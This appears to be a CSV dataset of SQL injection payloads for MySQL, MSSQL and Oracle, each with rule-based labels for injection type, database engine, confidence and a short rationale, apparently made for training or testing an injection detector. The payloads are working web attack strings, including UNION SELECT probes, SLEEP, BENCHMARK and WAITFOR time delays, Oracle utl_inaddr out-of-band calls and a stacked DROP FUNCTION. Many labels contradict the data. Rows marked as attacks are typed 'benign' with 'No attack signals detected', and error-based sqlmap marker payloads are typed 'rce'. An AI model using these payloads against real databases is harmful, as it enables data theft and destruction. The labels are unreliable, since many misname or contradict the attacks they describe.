row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4020,1' ) ) as fqia where 1936 = 1936 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4021,-1479%' or 5201 = 3398--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4022,1'+ ( select enzd where 6046 = 6046 and ( 3020 = 3020 ) *6703 ) +',1,,boolean_blind,generic,0.95,6046 = 6046 and detected — boolean_blind injection (priority 8) on generic,rule-based
4023,if ( 8264 = 1939 ) select 8264 else drop function nsoq--,1,,stacked_queries,generic,0.95,drop function detected — stacked_queries injection (priority 3) on generic,rule-based
4024,"1 ) as skby where 4269 = 4269 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4025,"1'|| ( select 'hfbt' where 7204 = 7204 union all select null,null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4026,"-5606 ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4027,"1"" ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""gozk"" = ""gozk",1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
4028,"1"" ) ) ) union all select null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4029,"1 ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4030,"-3805"" ) ) ) union all select 9123,9123,9123,9123,9123,9123,9123,9123#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4031,"-4970' ) union all select 4625,4625,4625,4625,4625,4625,4625,4625#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4032,"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4033,"1"" ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
4034,1' ) where 8204 = 8204,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4035,"1' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( 'llfp' = 'llfp",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
4036,1' ) ) as wuws where 6917 = 6917 union all select null#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4037,"1 and elt ( 2770 = 3669,3669 ) # sfls",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4038,"-3566' where 3641 = 3641 union all select 3641,3641,3641,3641,3641#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4039,"1"" ) ) as riui where 2605 = 2605",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4040,"1' and make_set ( 8403 = 8403,8899 ) and 'lnwe' = 'lnwe",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4041,"-5043%' ) ) ) union all select 5860,5860,5860,5860,5860#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4042,1 ) waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4043,-8519%' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( '%' = ',1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
